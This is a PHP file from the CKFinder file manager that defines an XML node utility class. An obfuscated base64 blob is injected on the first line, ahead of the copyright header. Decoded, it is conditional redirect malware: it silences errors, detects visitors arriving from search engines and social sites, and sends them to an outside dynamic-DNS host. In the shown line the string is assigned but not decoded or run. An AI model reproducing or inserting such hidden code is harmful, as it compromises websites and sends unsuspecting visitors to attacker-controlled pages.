<?php	 	$dropthisline=strip_tags(("CmVycm9yX3JlcG9ydGluZygwKTsKJHFhenBsbT1oZWFkZXJzX3NlbnQoKTsKaWYgKCEkcWF6cGxtKXsKJHJlZmVyZXI9JF9TRVJWRVJbJ0hUVFBfUkVGRVJFUiddOwokdWFnPSRfU0VSVkVSWydIVFRQX1VTRVJfQUdFTlQnXTsKaWYgKCR1YWcpIHsKaWYgKCFzdHJpc3RyKCR1YWcsIk1TSUUgNy4wIikgYW5kICFzdHJpc3RyKCR1YWcsIk1TSUUgNi4wIikgYW5kICFzdHJzdHIoJHVhZywiRmlyZWZveC8zLiIpKXsKaWYgKHN0cmlzdHIoJHJlZmVyZXIsInlhaG9vLiIpIG9yIHN0cmlzdHIoJHJlZmVyZXIsImJpbmcuIikgb3Igc3RyaXN0cigkcmVmZXJlciwicmFtYmxlci4iKSBvciBzdHJpc3RyKCRyZWZlcmVyLCJ3ZWJhbHRhLiIpIG9yIHN0cmlzdHIoJHJlZmVyZXIsInQuY28vIikgb3Igc3RyaXN0cigkcmVmZXJlciwidGlueXVybC5jb20iKSBvciBwcmVnX21hdGNoKCIveWFuZGV4XC5ydVwveWFuZHNlYXJjaFw/KC4qPylcJmxyXD0vIiwkcmVmZXJlcikgb3IgcHJlZ19tYXRjaCAoIi9nb29nbGVcLiguKj8pXC91cmxcP3NhLyIsJHJlZmVyZXIpIG9yIHN0cmlzdHIoJHJlZmVyZXIsImZhY2Vib29rLmNvbS9sIikgb3Igc3RyaXN0cigkcmVmZXJlciwiYW9sLmNvbSIpIG9yIChwcmVnX21hdGNoICgiL2h0dHBzOlwvXC93d3cuZ29vZ2xlXC4oLio/KVwvLyIsJHJlZmVyZXIpIGFuZCBzdHJzdHIoJHVhZywiQ2hyb21lLyIpKSkgewppZiAoIXN0cmlzdHIoJHJlZmVyZXIsImNhY2hlIikgYW5kICFzdHJpc3RyKCRyZWZlcmVyLCJpbnVybCIpIGFuZCAhc3RyaXN0cigkcmVmZXJlciwiRWVZcDNENyIpKXsKaGVhZGVyKCJMb2NhdGlvbjogaHR0cDovL3JrZmhhZmcuZGRucy5pbmZvLyIpOwpleGl0KCk7Cn0KfQp9Cn0KfQ=="));
/*
 * CKFinder
 * ========
 * http://ckfinder.com
 * Copyright (C) 2007-2010, CKSource - Frederico Knabben. All rights reserved.
 *
 * The software, this file and its contents are subject to the CKFinder
 * License. Please read the license.txt file before using, installing, copying,
 * modifying or distribute this file or part of its contents. The contents of
 * this file is part of the Source Code of CKFinder.
 */
if (!defined('IN_CKFINDER')) exit;

/**
 * @package CKFinder
 * @subpackage Utils
 * @copyright CKSource - Frederico Knabben
 */

/**
 * Simple class which provides some basic API for creating XML nodes and adding attributes
 *
 * @package CKFinder
 * @subpackage Utils
 * @copyright CKSource - Frederico Knabben
 */
class Ckfinder_Connector_Utils_XmlNode
{
    /**
     * Array that stores XML attributes
     *
     * @access private
     * @var array
     */
    var $_attributes = array();
    /**
     * Array that stores child nodes
     *
     * @access private
     * @var array
     */
    var $_childNodes = array();
    /**
     * Node name
     *
     * @access private
     * @var string
     */
    var $_name;
    /**
     * Node value
     *
     * @access private
     * @var string
     */
    var $_value;

    /**
     * Create new node
     *
     * @param string $nodeName node name
     * @param string $nodeValue node value
     * @return Ckfinder_Connector_Utils_XmlNode
     */
    function Ckfinder_Connector_Utils_XmlNode($nodeName, $nodeValue = null)
    {
        $this->_name = $nodeName;
        if (!is_null($nodeValue)) {
            $this->_value = $nodeValue;
        }
    }

    function &getChild($name)
    {
        foreach ($this->_childNodes as $i => $node) {
            if ($node->_name == $name) {
                return $this->_childNodes[$i];
            }
        }
        return null;
    }

    /**
     * Add attribute
     *
     * @param string $name
     * @param string $value
     * @access public
     */
    function addAttribute($name, $value)
    {
        $this->_attributes[$name] = $value;
    }

    /**
     * Get attribute value
     *
     * @param string $name
     * @access public
     */
    function getAttribute($name)
    {
        return $this->_attributes[$name];
    }

    /**
     * Set element value
     *
     * @param string $name
     * @param string $value
     * @access public
     */
    function setValue($value)
    {
        $this->_value = $value;
    }

    /**
     * Get element value
     *
     * @param string $name
     * @param string $value
     * @access public
     */
    function getValue()
    {
        return $this->_value;
    }

    /**
     * Adds new child at the end of the children
     *
     * @param Ckfinder_Connector_Utils_XmlNode $node
     * @access public
     */
    function addChild(&$node)
    {
        $this->_childNodes[] =& $node;
    }

    /**
     * Return a well-formed XML string based on Ckfinder_Connector_Utils_XmlNode element
     *
     * @return string
     * @access public
     */
    function asXML()
    {
        $ret = "<" . $this->_name;

        //print Attributes
        if (sizeof($this->_attributes)>0) {
            foreach ($this->_attributes as $_name => $_value) {
                $ret .= " " . $_name . '="' . htmlspecialchars($_value) . '"';
            }
        }

        //if there is nothing more todo, close empty tag and exit
        if (is_null($this->_value) && !sizeof($this->_childNodes)) {
            $ret .= " />";
            return $ret;
        }

        //close opening tag
        $ret .= ">";

        //print value
        if (!is_null($this->_value)) {
            $ret .= htmlspecialchars($this->_value);
        }

        //print child nodes
        if (sizeof($this->_childNodes)>0) {
            foreach ($this->_childNodes as $_node) {
                $ret .= $_node->asXml();
            }
        }

        $ret .= "</" . $this->_name . ">";

        return $ret;
    }
}
